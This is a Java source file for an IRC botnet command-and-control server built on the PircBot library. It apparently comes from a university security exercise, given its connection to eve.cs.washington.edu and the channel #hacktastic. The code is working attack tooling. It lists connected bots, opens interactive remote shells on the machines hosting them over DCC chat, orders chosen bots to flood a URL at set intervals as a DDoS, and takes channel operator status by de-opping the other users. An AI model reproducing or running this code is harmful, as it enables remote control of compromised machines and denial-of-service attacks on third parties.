import java.io.*;
import java.net.*;
import java.util.*;

import org.jibble.pircbot.*;

public class BotnetServer extends PircBot {
	private static final String[] COMMANDS = {"help", "names", "list", "shell", "ddos", "spam", "lease", "killbot", "destroybotnet"};
	
	private static final String SENTINEL = "$: ";
	private static final String TERMINATION = "exit";
	private static final String SERVER = "eve.cs.washington.edu";
	private static final String CHANNEL = "#hacktastic";
	private static final String NAME = "RandR";
	private static final boolean DEBUG = true;
	private static final int PORT = 6667;
	private static final int TIMEOUT = 120000;
	private Scanner input;
	private boolean inChat;
	
	public static void main(String[] args) {
		BotnetServer bn = new BotnetServer();
	}
	
	public BotnetServer() {
		input = new Scanner(System.in);
		try {
			setVerbose(DEBUG);
			setName(NAME);
			setMessageDelay(0);
			
			connect(SERVER, PORT);
			
			setMode(CHANNEL, "s");
			input = new Scanner(System.in);
		} catch (NickAlreadyInUseException e) {
			changeNick(NAME);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	protected void onConnect() {
		joinChannel(CHANNEL);
	}
	
	protected void onUserList(String channel, User[] bots) {
		for (int i = 0; i < bots.length; i++) {
			System.out.println("\t" + bots[i].toString());
		}
		init();
	}
	
	protected void onChannelInfo(String channel, int userCount, String topic) {
		System.out.println("\t" + channel + " (" + userCount + ")");
	}
	
	protected void onMessage(String channel, String sender, String login, String hostname, String message) {
		System.out.println("<" + sender + ">: " + message);
	}
	
	public void init() {
		System.out.print("Command: ");
		String message = input.nextLine();
		while(!message.toLowerCase().equalsIgnoreCase("q")) {
			performCommand(message);
			System.out.print("Command: ");
			message = input.nextLine();
		}
	}
	
	public void performCommand(String s) {
		if (s.toLowerCase().equalsIgnoreCase("help")) {
			printHelp();
		} else if (s.toLowerCase().equalsIgnoreCase("list")) {
			listChannels();
		} else if (s.toLowerCase().equals("names")) {
			User[] bots = getUsers(CHANNEL);
			for (int i = 0; i < bots.length; i++) {
				System.out.println("\t" + bots[i].toString());
			}
		} else if (s.toLowerCase().equalsIgnoreCase("setop")) {
			acquireOpStatus();
		} else if (s.toLowerCase().startsWith("shell")) {
			String[] parts = s.split(" ");
			if (parts.length >= 3) {
				engageInChat(parts[1], Integer.parseInt(parts[2]));
			} else if (parts.length >= 2) {
				engageInChat(parts[1], TIMEOUT);
			} else {
				System.out.println("\tUsage: shell botNick [timeout]");
			}
		} else if (s.toLowerCase().startsWith("ddos")) {
			String[] parts = s.split(" ");
			if (parts.length < 5) {
				System.out.println("\tUsage: DDOS url interval duration bot [more bots]");
			} else {
				String command = parts[0] + " " + parts[1] + " " + parts[2] + " " + parts[3];
				String[] bots = Arrays.copyOfRange(parts, 4, parts.length);
				for (int i = 0; i < bots.length; i++) {
					this.sendMessage(bots[i], command);
				}
			}
		} else if (s.startsWith(":")) {
			sendMessage(CHANNEL, s.substring(1));
		} else if (!s.isEmpty()) {
			sendRawLine(s);
		}
	}
	
	private void acquireOpStatus() {
		op(CHANNEL, NAME);
		User[] bots = getUsers(CHANNEL);
		for (int i = 0; i < bots.length; i++) {
			System.out.println(bots[i].getNick());
			if (!bots[i].getNick().equals(NAME)) {
				deOp(CHANNEL, bots[i].toString());
			}
		}
		op(CHANNEL, NAME);
	}
	
	private void printHelp() {
		System.out.println("\tBotnet:");
		System.out.println("\t\tList");
		System.out.println("\t\t\tlists the available channels on this server");
		System.out.println("\t\tNames");
		System.out.println("\t\t\tlists the bots currently on this channel");
		System.out.println("\t\tShell usernick [timeout]");
		System.out.println("\t\t\topens a remote shell with the machine hosting the user");
		System.out.println("\t\t\twith the given nick (type \"exit\" to exit shell)");
		System.out.println("\t\t\tif you need to type \"exit\" without leaving the shell add a space at the end");
		System.out.println("\t\tDDOS url interval duration bot [more bots]");
		System.out.println("\t\t\trequests the given url every 'interval' seconds for");
		System.out.println("\t\t\t'duration' seconds from each of the given bots (pass 'all' to use all bots)");
	}
	
	private void engageInChat(String botNick, int timeout) {
		DccChat chat = dccSendChatRequest(botNick, timeout);
		if (chat == null) {
			System.out.println("The chat request was rejected.");
		} else {
			Scanner input = new Scanner(System.in);
			Scanner shellout = new Scanner(chat.getBufferedReader());
			
			try {
				System.out.print(shellout.nextLine());
				
				String command = input.nextLine();
				while (!command.equalsIgnoreCase(TERMINATION)) {
					chat.sendLine(command);
					String response = shellout.nextLine();
					while (!response.endsWith(SENTINEL)) {
						System.out.println("\t" + response);
						response = shellout.nextLine();
					}
					System.out.print(response);
					command = input.nextLine();
				}
				chat.sendLine(command);
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
}
